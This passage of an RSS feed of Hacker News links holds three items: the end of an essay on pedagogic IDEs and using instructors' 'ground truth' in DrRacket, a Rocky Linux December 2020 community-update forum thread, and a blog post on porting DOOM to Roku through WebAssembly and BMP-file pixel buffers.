Hard</a></p></td></tr><tr><td></td></tr><tr><td><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><a href="#%28part._.Progress%29" data-pltdoc="x">8<span>&nbsp;</span>Progress</a></p></td></tr><tr><td></td></tr><tr><td><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><a href="#%28part._.Credits%29" data-pltdoc="x">9<span>&nbsp;</span>Credits</a></p></td></tr></tbody></table><p>I have been thinking about the design, technology, and human factors aspects of
programming environments—<wbr>henceforth <span>IDE</span>s, for “integrated development
environments”—<wbr>for decades. This article records my current thinking (as of
2020), and will probably grow over time.</p><h3>1<tt>&nbsp;</tt><a name="(part._.At_the_.Beginning)"></a>At the Beginning</h3><p>We began the <a href="https://www.drracket.org/">DrRacket</a> project (then called DrScheme) in 1995 on the
premise that we wanted to build a <span>pedagogic</span> <span>IDE</span>. Our initial goals
were set by our context: students learning to program in Scheme inside
Emacs. Each such institution had its own set of idiosyncratic Emacs
key-bindings that students were forced to memorize, while also being plunged
into the complexity of an editor vastly more sophisticated than anything they
had used before, where any odd key combination could drop them into a confusing
state from which recovery often needed expert help.<span><span><span>No, this is not an
Emacs rant. For the record, I still use Emacs. In fact, this article was
written using Emacs.</span></span></span> It was hardly student-friendly for all but the most
adventurous (who, of course, loved it).</p><p>At the same time, this is when the US’s AP Computer Science curriculum was
shoving C++ down the throats of schools. As a result, many students were
entering college having seen a sophisticated graphical <span>IDE</span> like Visual
C++. On the one hand, these set an expectation amongst students that an <span>IDE</span>
would be a rich graphical environment that looked like a native application;
its absence made education feel inauthentic. On the other hand, the number of
buttons and options in such <span>IDE</span>s were problematic. Many students felt
overwhelmed; a few (probably the same ones who loved discovering the recesses of
Emacs) clicked away at random, losing sight of fundamental learning.</p><p>Thus, at the very outset, we had three goals:
</p><div><ul><li><p>Make a reasonable, modern, native-looking application.</p></li><li><p>Make a stand-alone application where we can control the experience,
rather than an island surrounded by a sea of dragons.</p></li><li><p>Minimize distraction, confusion, and unnecessary (especially undesirable)
choice.</p></li></ul></div><p>We have since grown comfortable with applications being delivered through the
Web, so Web-based <span>IDE</span>s are now a reasonable alternative to that native
application, and indeed confer many benefits that the native application does
not. However, these conceptual rules remain important.</p><h3>2<tt>&nbsp;</tt><a name="(part._.More_.Insights)"></a>More Insights</h3><p>As we continued to build DrRacket, a few more rules became clear. We have
documented them and their justification extensively elsewhere (such as
<a href="https://cs.brown.edu/~sk/Publications/Papers/Published/fffkf-drscheme-journal/">this paper</a> and
<a href="https://cs.brown.edu/~sk/Publications/Papers/Published/fffkbmt-programmable-prog-lang/">this one</a>),
so I’ll just summarize them here:
</p><div><ul><li><p>Languages evolve by accruing complexity, which can create dangerous reefs
on which students can founder. We need principled, teaching-friendly
sub-languages that eliminate accidental complexity.<span><span><span>Even if a language is
designed from scratch to avoid this problem, it can still contain different
levels of complexity.</span></span></span></p></li><li><p>Just as a textbook does not plunge students into a whole language at once
but rather builds it up incrementally, <span>IDE</span>s should introduce the language
incrementally, matching a book’s needs and supporting a learning progression.</p></li><li><p>Errors matter! Error messages should be carefully written to be friendly
and helpful to students, whose needs may be different from those of a
developer.</p></li><li><p>Sub-languages must be epistemically closed, with errors inside this
closure. Concretely, error messages should never use vocabulary or concepts
beyond what has been introduced up to that point in the curriculum.</p></li></ul></div><p>These principles drove the development of DrRacket. Furthermore,
<a href="https://racket-lang.org/">Racket</a> created
<a href="https://cs.brown.edu/~sk/Publications/Papers/Published/ffkf-mred/">linguistic</a>
<a href="https://cs.brown.edu/~sk/Publications/Papers/Published/fffkbmt-programmable-prog-lang/">abstractions</a>
that embodied these ideas. This enabled several textbooks to map their own
learning progressions to corresponding sub-languages in DrRacket, giving their
student users the same benefits that users of <span><a href="https://htdp.org/">How to Design Programs</a></span> enjoyed.</p><h3>3<tt>&nbsp;</tt><a name="(part._.More_.About_.Feedback)"></a>More About Feedback</h3><p>We weren’t done with error messages (and <span>IDE</span> feedback more
generally). Starting in 2010, <a href="https://gmarceau.qc.ca/">Guillaume Marceau</a>,
<a href="https://cs.brown.edu/~kfisler/">Kathi Fisler</a>, and I began to investigate the error messages of
DrRacket using the methods of <span>HCI</span>. What
<a href="https://cs.brown.edu/~sk/Publications/Papers/Published/mfk-measur-effect-error-msg-novice-sigcse/">we found</a>
was deeply disturbing: that the errors often were not helping students fix
their problems.</p><p>Indeed,
<a href="https://cs.brown.edu/~sk/Publications/Papers/Published/mfk-mind-lang-novice-inter-error-msg/">we also found</a>
that even the vocabulary used in messages was difficult for
students. For instance, we had carefully distinguished between concepts like
“operator”, “constructor”, and “predicate”. But for students who had not
yet picked up those distinctions, these all looked like gobbledygook; the only
term they were familiar with was “function”. This necessitated
<span>removing</span> these careful distinctions to make the messages more
decipherable and hence actionable. We also noticed that instructors often used
vocabulary different from that of the <span>IDE</span>; libraries also created their own
ontology or used their own style that contradicted the <span>IDE</span>. In short,
</p><div><ul><li><p><span>IDE</span> feedback lives in an ecosystem consisting of the programming
language, books, third-party libraries, educators, and more. All of these need
to be in harmony, and require style guides to facilitate agreement.</p></li></ul></div><h3>4<tt>&nbsp;</tt><a name="(part._.Ground_.Truth)"></a>Ground Truth</h3><p>Over the past few years, I’ve come to realize there is another critical aspect
to pedagogic <span>IDE</span>s that truly distinguishes them from a conventional <span>IDE</span>
designed for a developer. It’s that a pedagogic <span>IDE</span> has <span>ground truth</span>.
I’ve been pursuing this under various guises for some years now, but only in the past
two years have these pursuits coalesced into a clear thesis.</p><p>Here’s what I mean by ground truth. In almost every pedagogic setting, we are
asking students to create <span>something we have already done</span>.</p><p>In a conventional programming setting, such as in industry, programmers do not
re-build perfect replicas of existing systems. If they’re re-implementing a
system, often it’s with an eye to at least improving it, and usually to
ultimately changing it. In the very rare cases that they want to identically
reproduce a system, it’s usually for intellectual property reasons, and thus
done with various safeguards against communication. In general, though, the
thing they are trying to build doesn’t already exist (which is why they’re
building it—<wbr>if it already existed in good form, they would be put to work on
something else).</p><p>This is the opposite of what we do in education. In education, it is utterly
standard for a hundred students to all be striving, independently, to perfectly
reproduce something we have already done.<span><span><span>Indeed, great effort goes into
making sure these students don’t merely pawn off as their own what other
students have done.</span></span></span> Indeed, there are solid educational reasons for this. The
fact that we have done all this already, and can often point to our work as
exemplary, gives us a <span>ground truth</span> that conventional programming
lacks. My thesis is that:</p><p><span>This ground truth can and should be <br>
exploited to improve student learning.</span></p><h3>5<tt>&nbsp;</tt><a name="(part._.How_.Can_.We_.Use_.Ground_.Truth_)"></a>How Can We Use Ground Truth?</h3><p>In a way, numerous educators, for decades, have been using ground truth: by
giving students a test suite against which to run their programs. I find this
practice odious for several reasons:<span><span><span>If you are going to do it anyway, at
least avoid the
<a href="https://cs.brown.edu/~sk/Publications/Papers/Published/wkf-who-tests-testers/">perils we’ve identified</a>.</span></span></span>
It promotes “passing the instructor’s
suite” as the most important trait a program should satisfy (whereas, often,
it is one of the least important). It fails to teach students to think about
correctness for themselves, treating it as an outsourced activity. It often
encourages a mentality of “keep tweaking and submitting until you pass”,
which as a programming practice is both utterly unauthentic and arguably
dangerous. (Adding rate limits is a symptom of a problem with the pedagogy, not
a solution.) More subtly, and perhaps worse, it robs students of important
<a href="https://cs.brown.edu/~sk/Publications/Papers/Published/wk-examplar/">stimuli for problem understanding</a>.
But most of all, this is primarily a means of <span>assessment</span>, not of
<span>instruction</span>.</p><p>Nevertheless, we can recognize in this widely-used practice the germ of this
idea, but we should turn it into a student aid, and we need to generalize
it. Why has it not already been widely generalized? I would argue for two
reasons, one pedagogic and one technical:
</p><div><ul><li><p>We don’t ask students to produce a broad enough range of artifacts.</p></li><li><p>Comparing artifacts is hard from a technical perspective. Relatedly,
giving actionable feedback is hard both technically and from a human factors
perspective.</p></li></ul></div><h3>6<tt>&nbsp;</tt><a name="(part._.Multiple_.Artifacts)"></a>Multiple Artifacts</h3><p><span><a href="https://htdp.org/">How to Design Programs</a></span> is perhaps the canonical example of a programming pedagogy
that asks students to produce (a) multiple artifacts, that are (b)
interrelated, and are in a (c) progression that matches progress through
problem-solving. Concretely, students are asked to produce
</p><div><ul><li><p>data definitions</p></li><li><p>a purpose statement</p></li><li><p>a function signature</p></li><li><p>examples of function use</p></li><li><p>a function template</p></li><li><p>the function body</p></li><li><p>tests of the function</p></li></ul></div><p>The nice thing about having multiple artifacts from different stages of
development is that:
</p><div><ul><li><p>We can give feedback early.</p></li><li><p>We can correct problems when it doesn’t cost much to fix them. (Once a
student has fully implemented their system, giving feedback on failing tests
will invariably only produce minor tweaks in the program, never large-scale
architectural changes.)</p></li><li><p>We can give different kinds of feedback, some of which will be better
appreciated by some students and others better by others.</p></li><li><p>We can make the desolate progression from a blank page to a fully-working
program a more rich, textured interaction between student and (otherwise
foreboding and hostile) tool.</p></li></ul></div><p>Imagine that for each of the artifacts above, we have our own ground truth
versions (which presumably we have written while developing the problem). We
can, in principle, compare
</p><div><ul><li><p>our data definition against theirs</p></li><li><p>our function signature against theirs</p></li><li><p>our examples against theirs</p></li></ul></div><p>and so on. But we can also compare each of these artifacts against <span>other
kinds</span> of artifacts. Running their program against our tests is conventional
practice, but we have many more choices:
</p><div><ul><li><p>our data against their data definition</p></li><li><p>ou…</p></li></ul></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://parentheticallyspeaking.org/articles/pedagogic-ide/">https://parentheticallyspeaking.org/articles/pedagogic-ide/</a></em></p>]]>
            </description>
            <link>https://parentheticallyspeaking.org/articles/pedagogic-ide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25524045</guid>
            <pubDate>Thu, 24 Dec 2020 00:46:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rocky Linux December 2020 community update]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25523895">thread link</a>) | @curt15
<br/>
December 23, 2020 | https://forums.rockylinux.org/t/community-update-december-2020/1157 | <a href="https://web.archive.org/web/*/https://forums.rockylinux.org/t/community-update-december-2020/1157">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-outlet">
        

  


      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          


          <p><span>
              <meta itemprop="datePublished" content="2020-12-23T03:10:41Z">
              <time itemprop="dateModified" datetime="2020-12-23T16:26:26Z">
                December 23, 2020,  4:26pm
              </time>
          <span itemprop="position">#1</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          
<h2>Summary</h2>
<p>Our teams are working to coordinate the many individuals and organizations that have offered to help advance The Rocky Linux Foundation, Inc. (Rocky Linux). The core team is working to lay the infrastructure that will support the legal entity and the engineering efforts required to deliver and support an initial release. Updates regarding project news, release dates, and more will be announced on our <a href="https://forums.rockylinux.org/">forums</a>, <a href="https://rockylinux.org/">website</a>, and <a href="https://forums.rockylinux.org/t/all-rocky-linux-links/833">other social media platforms</a>.</p>
<h3>Timeline</h3>
<p>Transparency with the community and for those that will be relying on Rocky Linux to supplant their CentOS 8 installations before support expiration is paramount. We will soon be communicating a timeline for the delivery of the following:</p>
<ul>
<li>Build systems and infrastructure readiness</li>
<li>Automatic package build infrastructures</li>
<li>When the testing package repository will be made public</li>
<li>Installer testing readiness</li>
<li>ETA for length of time needed for community testing</li>
<li>Release candidate availability</li>
</ul>
<p>We are targeting Q2 2021 to deliver our first release of Rocky Linux, made available not only in standard commercial regions, but also <a href="https://aws.amazon.com/govcloud-us">GovCloud</a>, and China.</p>
<hr>
<p>Over the past three weeks, here is some of the progress we’ve made:</p>
<h2>Infrastructure</h2>
<ul>
<li>We have selected and vetted auditing, logging, and user account management tooling.</li>
<li>Amazon Web Services (AWS):
<ul>
<li>The team selected AWS as the primary build platform for development of Rocky Linux. AWS was chosen primarily to protect the integrity of the software supply chain for Rocky Linux.</li>
<li>Unfortunately, donated hardware and rack space isn’t sufficient to meet our supply chain integrity needs.</li>
<li>Traditional physical hardware separate from our production build environment will still be necessary, and we expect a large portion of our infrastructure will exist outside of AWS for the purposes of business continuity, cost, and platform agnosticity.</li>
<li>We have outlined an infrastructure to best secure and facilitate our engineering efforts using multiple VPCs, subnets, and regions for high availability.</li>
</ul>
</li>
<li>Data Centers:
<ul>
<li>We are negotiating with several data center providers for the secure hosting of our physical infrastructure.</li>
<li>After we have our physical infrastructure provider solidified, we will reach back out to those that have offered to donate hardware .</li>
<li>Discussions with the Oregon State University Open Source Lab (<a href="https://osuosl.org/">OSUOSL</a>) regarding resources are in the works.</li>
</ul>
</li>
</ul>
<p>The core tenets of the Infrastructure Team are:</p>
<ul>
<li>To provide a platform for the automatic and secure builds of packages and components which will allow for community participation without sacrificing security or trust in the resulting packages</li>
<li>The integrity of the build pipeline and software supply chain are paramount.</li>
<li>Be as vendor and platform agnostic as possible. Avoid vendor lock-in.</li>
<li>Be transparent with the community, to the extent possible and practical.</li>
</ul>
<h2>Release Engineering and Packaging</h2>
<ul>
<li>The build process for Rocky Linux will use <a href="https://fedoraproject.org/wiki/Koji">Koji</a> and <a href="https://pagure.io/fm-orchestrator/tree/master">MBS</a>.</li>
<li>We are developing scripts and build tools to create a pipeline that allows pulling sources, debranding, and building through Koji and <a href="https://github.com/rpm-software-management/mock/wiki">Mock</a>.</li>
<li>The progress of proof of concepts and processes utilized by the Rocky Linux build process, including all errors and dependencies, is being documented in the <a href="https://wiki.rockylinux.org/en/Development">wiki</a>.</li>
</ul>
<h2>Security</h2>
<ul>
<li>The Security team has drafted a Data Classification Policy, which will be made available for public comment pending review.</li>
<li>Groups, members, and permissions structures for the build infrastructure have been laid out for review and evaluation.</li>
<li>In parallel with the infrastructure team, we have architected and designed AWS network and security topologies aligned with best practices and security standards.</li>
<li>Work has started on OpenSCAP documents for popular STIGs.</li>
<li>Plans are being made with the goal of Rocky Linux becoming FIPS compliant.</li>
</ul>
<h2>Web</h2>
<ul>
<li>In only 12 days, our <a href="https://forums.rockylinux.org/">forums</a> have received nearly 150K page views.</li>
<li>Bandwidth to GitHub resources has exceeded the current plan, requiring an upgrade.</li>
</ul>
<h2>Community</h2>
<ul>
<li>We have chosen <a href="https://rbcreative.team/">Red Barn Creative Team</a> (<em>formerly Hackerthreads</em> ) as the designated / authorized vendor to sell Rocky Linux branded merchandise. We are awaiting proofs from their designers to present to the community, and will as well be accepting submissions for designs.</li>
<li>Over 370 people have responded to our <a href="https://docs.google.com/forms/d/e/1FAIpQLSfEXnqD1sNHz9cslkMNOk6krUtDdSCYbxL68TTsn7uGZnoSFQ/viewform">form for registering volunteers</a> and supporters.</li>
<li>A blog and mailing list for future announcements and community updates is in development.</li>
<li>We have outgrown Slack due to the size of the community and required feature sets, and will therefore be migrating to <a href="https://mattermost.com/">Mattermost</a>. This open source platform has a number of features we’ll be taking advantage of, including: an IRC bridge, multi-factor authentication, advanced logging / auditing / security capabilities, and fidelity in channel and access permissions.</li>
<li>Social media following:
<ul>
<li>4.3K active members on Slack</li>
<li>169 followers on <a href="https://linkedin.com/company/rockylinux">LinkedIn</a> with 1.3K post impressions</li>
<li>4K followers on <a href="https://twitter.com/rocky_linux">Twitter</a> with an average of 22K impressions and 3575 interactions per tweet</li>
<li>3K members in <a href="https://www.reddit.com/r/RockyLinux">/r/RockyLinux on Reddit</a>.</li>
</ul>
</li>
</ul>
<h2>Special Interest Groups (SIG)</h2>
<ul>
<li>We have received a number of requests for SIGs on a variety of different topics:
<ul>
<li>Desktop / Laptop</li>
<li>Enhanced Security</li>
<li>Kubernetes / Cloud Native</li>
<li>Minimal Install / OS Bootstrap</li>
<li>Storage appliance</li>
<li>HPC and next generation HPC</li>
</ul>
</li>
<li>The evolution of a SIG should result in optional package repositories and/or custom installers.</li>
<li>We will need leaders for SIGs as well as proposals.</li>
<li>Timelines for these proposals will be coming soon.</li>
</ul>
<p><em>Note: Rocky Linux is first and foremost a freely available Enterprise Linux clone. SIGs will optionally enhance that base and provide extra packages and capabilities to that stable base. At no point will a SIG affect the default core of Rocky Linux.</em></p>
<h2>Sponsors</h2>
<ul>
<li>We have a number of companies who have stepped up to sponsor the Rocky Linux Foundation in the form of developers, hardware, cloud instances, and money.</li>
<li>Sponsorship will have different levels, and we are happy to speak with organizations interested in helping.</li>
<li>All contributors will be publicly thanked on our website.</li>
</ul>
<h2>Legal</h2>
<ul>
<li>The Rocky Linux Foundation, Inc. has been registered as a legal not-for-profit entity in the United States (Delaware).</li>
<li>An application for 501(​c)(3) non-profit status will be submitted as we mature and can afford the legal representation to do so.</li>
<li>We are considering licensing for our data that will enable the greatest flexibility for our community. At present, the team is leaning towards the 3 Clause BSD license, but community input is welcome on this decision.</li>
</ul>
<h2>Localization</h2>
<ul>
<li>A <a href="https://forums.rockylinux.org/c/localization/10">localization category</a> has been created on our forums, with many people interested in helping with translations to a number of languages including Spanish, French, Italian, German, Chinese, Afrikaans, Greek, Turkish, and many more.</li>
<li>We will be working to ensure future newsletters are translated to as many languages as possible.</li>
</ul>
<p>If you have an interest in assisting with translations, please reach out via the <a href="https://forums.rockylinux.org/c/localization/10">localization category of our forums</a>.</p>
<hr>
<p>Lastly, this wouldn’t at all be possible without <em>you</em>. We’re immensely grateful for the community’s enthusiasm, excitement, and help. Rocky Linux is, and will  remain a community-driven effort.</p>
<p>If you would like to contribute to Rocky Linux, please take a moment to fill out our <a href="https://forms.gle/F3crDYVkq79pDtr49">participation form</a> if you haven’t already done so. This form will allow us to expand and gauge interest in teams.</p>
<p>If you have any questions, comments, concerns, suggestions, or would like to help out, please reach out to us via email at:  <a href="mailto:hello@rockylinux.org">hello@rockylinux.org</a>.</p>
<p>Sincerely,<br>
The Rocky Linux Foundation<br>
<a href="https://rockylinux.org/">https://rockylinux.org</a></p>
        </div>

        <meta itemprop="headline" content="Community Update - December 2020">
          <meta itemprop="keywords" content="">

        

         

            
      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://forums.rockylinux.org/u/jorp"><span itemprop="name">jorp</span></a>
            
              pinned globally 
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2020-12-23T03:40:32Z">
                December 23, 2020,  3:40am
              </time>
              <meta itemprop="dateModified" content="2020-12-23T03:40:32Z">
          <span itemprop="position">#2</span>
          </span>
        </p></div>
        

        <meta itemprop="headline" content="Community Update - December 2020">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          <p>Thanks for the update <a href="https://forums.rockylinux.org/u/jorp">@jorp</a>, great summary.</p>
<p>Minor nit, can we change the wording of ‘Spring 2021’ to something more internationally consistent? eg. a month or quarter in 2021.</p>
        </div>

        <meta itemprop="headline" content="Community Update - December 2020">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://forums.rockylinux.org/u/jorp"><span itemprop="name">jorp</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2020-12-23T06:02:44Z">
                December 23, 2020,  6:02am
              </time>
              <meta itemprop="dateModified" content="2020-12-23T06:02:44Z">
          <span itemprop="position">#5</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          
<p>That was a great suggestion and definitely not a nitpick in my book. I’ve edited accordingly, thank you for pointing that out.</p>
        </div>

        <meta itemprop="headline" content="Community Update - December 2020">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://forums.rockylinux.org/u/defcon3"><span itemprop="name">defcon3</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2020-12-23T08:45:14Z">
                December 23, 2020,  8:45am
              </time>
              <meta itemprop="dateModified" content="2020-12-23T08:45:14Z">
          <span itemprop="position">#6</span>
          </span>
        </p></div>
        <p>GREAT,<br>
thanks for the update.</p>

        <meta itemprop="headline" content="Community Update - December 2020">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://forums.rockylinux.org/u/Faisal"><span itemprop="name">Faisal</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2020-12-23T09:15:26Z">
                December 23, 2020,  9:15am
              </time>
              <meta itemprop="dateModified" content="2020-12-23T09:15:26Z">
          <span itemprop="position">#7</span>
          </span>
        </p></div>
        <p>I’m suggesting something that maybe seen as a huge undertake that I don’t know if it’s even possible or at least could prove stable.<br>
A migration script from CentOS 7/8 to our Rocky.</p>

        <meta itemprop="headline" content="Community Update - December 2020">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://forums.rockylinux.org/u/muzilee"><span itemprop="name">muzilee</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2020-12-23T09:35:52Z">
                December 23, 2020,  9:35am
              </time>
              <meta itemprop="dateModified" content="2020-12-23T09:35:52Z">
          <span itemprop="position">#8</span>
          </span>
        </p></div>
        

        <meta itemprop="headline" content="Community Update - December 2020">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://forums.rockylinux.org/u/xtus"><span itemprop="name">xtus</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2020-12-23T10:14:56Z">
                December 23, 2020, 10:14am
              </time>
              <meta itemprop="dateModified" content="2020-12-23T10:14:56Z">
          <span itemprop="position">#9</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          
<p>I’m not a US …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://forums.rockylinux.org/t/community-update-december-2020/1157">https://forums.rockylinux.org/t/community-update-december-2020/1157</a></em></p>]]>
            </description>
            <link>https://forums.rockylinux.org/t/community-update-december-2020/1157</link>
            <guid isPermaLink="false">hacker-news-small-sites-25523895</guid>
            <pubDate>Thu, 24 Dec 2020 00:24:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Doom Running on Roku via WebAssembly]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25523891">thread link</a>) | @syrusakbary
<br/>
December 23, 2020 | https://motley-coder.com/2020/12/23/doom-on-roku/ | <a href="https://web.archive.org/web/*/https://motley-coder.com/2020/12/23/doom-on-roku/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>It’s all fine and dandy to <a href="https://motley-coder.com/2020/12/20/webassembly-on-roku/">say you got C compiling for the Roku</a>, but can you really in good conscience claim that C works if you haven’t got DOOM running?</p>



<p>If you want to see the end result, <a href="https://my.roku.com/account/add?channel=doom">click here to play DOOM on your Roku</a>. And if you’d like to see the source, visit the <a href="https://github.com/TrevorSundberg/wasm2brs">wasm2brs</a> project and check out the samples directory where you’ll find DOOM:</p>



<p><a href="https://github.com/TrevorSundberg/wasm2brs">https://github.com/TrevorSundberg/wasm2brs</a></p>



<p>When it came to picking an implementation of DOOM, I decided to go with the SDL port because I’m familiar with the SDL API. Before even trying to get it running on the Roku I wanted to see it running on my local machine.</p>



<p>Several segmentation faults later, I realized that the original DOOM code made a lot of assumptions about the size of a pointer being 32 bit and my default compiler was set to compile in 64 bit. Eventually that led me to <a href="https://github.com/makava/sdldoom-1.10-mod">this modification of the SDL port</a>. The user <a href="https://github.com/makava">makava</a> provided the command line arguments I needed to get a running version on my PC, and from there I was confident I could make it run on Roku!</p>



<h2>WASI WAD file</h2>



<p>Before getting any graphical or audio output, our first goal is to get the game loading. All of the textures, sounds, levels, text, etc that DOOM loads comes from their proprietary format, the .WAD file. What’s more impressive is that the same engine can run DOOM and DOOM2, and many other flavors. It does this in the function <a href="https://github.com/TrevorSundberg/wasm2brs/blob/a4f2e7ffa6b1d577d010e0423e77b534cd0db121/samples/doom/src/d_main.c#L551">IdentifyVersion</a> by scanning for the existence of any of the known .WAD file names. In our case, we’re using <code>doom1.wad</code> because that’s the shareware / demo version of the original DOOM.</p>



<p>By default, it checks if the environment variable <code>DOOMWADDIR</code> is present, and if not it uses the relative path of <code>./doom1.wad</code>. Because I use <em>wasienv</em> as a convenience to compile WebAssembly programs that target <em>wasi-libc</em>, they include a <code>preamble.h</code> that defines <a href="https://github.com/wasienv/wasienv/blob/6be5a222a9fea986f000a05842ddf45bc085a2b2/wasienv/stubs/preamble.h#L60">getcwd as returning an empty string</a>. In the case of Roku, when opening a file it must begin with the device, such as <code>pkg:/</code>, and since our working directory was empty, the relative path <code><code>./doom1.wad</code></code> did not resolve to a proper Roku path. The simplest fix was to set <code>DOOMWADDIR</code> to <code>pkg:/source</code> and place the <code>doom1.wad</code> in the <code>source</code> directory. It should be noted that as of November 30th 2020, <a href="https://github.com/WebAssembly/wasi-libc/pull/214">wasi-libc now has emulation of getcwd</a>.</p>



<h2>The Clock</h2>



<p>Our second goal is to put a print statement in the main loop and show that frames are indeed being processed. In the SDL port, every frame it would call <code>SDL_GetTicks</code> to determine how much time had passed. In DOOM there are 35 ticks per second, which is defined by <code>TICRATE</code>.</p>



<p>Luckily, <em>wasi-libc</em> has an implementation of <code>clock_gettime</code> which in turn calls our implementation of <code>wasi_snapshot_preview1_clock_time_get</code>. On the Roku, we used the <a href="https://developer.roku.com/docs/references/brightscript/interfaces/ifdatetime.md">ifDateTime</a> to compute milliseconds and seconds. Our minor change in DOOM now looks like:</p>



<pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">struct timespec spec;
clock_gettime(CLOCK_MONOTONIC, &amp;spec);
int ms = spec.tv_sec * 1000 + spec.tv_nsec / 1000000;
return (ms * TICRATE) / 1000;</pre>



<p>What was even more exciting, at this point I added a print here and sure enough when I ran it on the Roku I saw it getting called every frame!</p>



<h2>Pixel Buffer 1: Drawing Rectangles as Pixels</h2>



<p>When I first started playing with graphics on Roku, I was surprised to find that BrightScript has no exposed functions to upload an array of pixels to a texture. The primary drawing interface is <a href="https://developer.roku.com/docs/references/brightscript/interfaces/ifdraw2d.md">ifDraw2D</a> which is akin to the HTML canvas element. They even have <a href="https://developer.roku.com/docs/references/brightscript/interfaces/ifdraw2d.md#getbytearrayx-as-integer-y-as-integer-width-as-integer-height-as-integer-as-object">GetByteArray(…)</a>, but sadly no SetByteArray.</p>



<p>By default with no scaling, DOOM runs at a resolution of 320×200 which is 64,000 pixels. I’m a fan of going for the slowest brute force approach first, but unfortunately this was the only approach I could think of. Rather than setting individual pixels, we could draw a single 1×1 rectangle for each pixel using <a href="https://developer.roku.com/docs/references/brightscript/interfaces/ifdraw2d.md#drawrectx-as-integer-y-as-integer-width-as-integer-height-as-integer-rgba-as-integer-as-void">DrawRect(…)</a>.</p>



<p>This approach was slower than I could have imagined. I achieved about 3-4 frames per second on my TCL 7137X with an ARM dual core 1.2 GHz processor. That doesn’t leave any time for the game logic and rendering. We’re looping over every pixel, loading memory to get the color of the pixel, and calling <code>DrawRect</code>.</p>



<p>I also found an internal limitation where it seems they are using an unsigned 16 bit integer for the number of draw calls. Beyond 65,535 calls to <code>DrawRect</code> it would discard all the original calls. Keep in mind 320×200 is 64,000 so you can’t get much bigger than that.</p>



<p>Overall this approach was a bust. I needed to put my thinking cap on to come up with another way to make a pixel buffer.</p>



<h2>Pixel Buffer 2: Reading BMP Files From The Disk</h2>



<p>That’s right, you read that correctly. If the first approach above seemed at least reasonable, this approach usually makes people’s jaw drop.</p>



<p>BrightScript again has no interface to upload binary image data, but they do have <a href="https://developer.roku.com/docs/references/brightscript/components/robitmap.md">roBitmap</a> whose constructor can take a file path to an image. Moreover, the <a href="https://developer.roku.com/docs/references/brightscript/interfaces/ifbytearray.md">ifByteArray</a> has methods to write a portion of the array to disk, namely the second overload of <a href="https://developer.roku.com/docs/references/brightscript/interfaces/ifbytearray.md#writefilepath-as-string-start_index-as-integer-length-as-integer-as-boolean">WriteFile</a> and <a href="https://developer.roku.com/docs/references/brightscript/interfaces/ifbytearray.md#appendfilepath-as-string-start_pos-as-integer-length-as-integer-as-boolean">AppendFile</a>. The fact that it takes an offset and length is a huge win, because it means we can implement a <em>zero copy</em> pixel buffer… at least if you consider that we don’t have to loop over the pixels ourselves in BrightScript which is extremely slow.</p>



<p>Moreover, as I dug into writing files on Roku I found <a href="https://developer.roku.com/docs/developer-program/getting-started/architecture/file-system.md">this documentation</a> which tells us that the <code>tmp:/</code> storage device is most likely in memory due to it discarding contents when the app exits. That means writes and reads to this device will be very quick!</p>



<p>And this final details takes the cake. I was trying to figure out what image format I wanted to write… uncompressed PNG maybe? Ideally it had be a format that I didn’t need to do any transformation of the pixel data to store. In other words, DOOM’s internal screen should be directly writable to the disk / pixel data section of the image, with no modification or looping over pixels.</p>



<p>DOOM uses 8 bits per pixel (single byte) and a 256 color palette. That’s when I remembered that Microsoft’s BMP format supports 8 bit color. To my excitement, DOOM’s screen format could be directly written out as a section of the BMP, as well as the color palette!</p>



<p>For a test, I created a 320×200 bitmap with 256 colors and timed how many I could load in one second. Obviously it’s possible Roku could have some caching behavior, however I was able to get about 125 fps with each one taking from 7 to 8 milliseconds:</p>



